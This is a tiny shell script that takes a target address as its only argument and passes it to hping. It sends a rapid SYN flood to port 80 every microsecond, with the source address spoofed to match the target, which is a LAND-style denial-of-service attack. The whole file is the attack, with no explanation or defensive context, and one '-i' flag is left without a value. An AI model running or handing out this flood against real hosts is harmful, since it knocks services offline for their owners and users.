if [ $# -lt 1 ]
then
    echo "ERROR: Not enough arguments were provided!"
    exit 1
fi

# Define variables
a=$1
b=${a}
echo "$b"
hping -i -S $b -a $b -p 80 -i u1 --syn
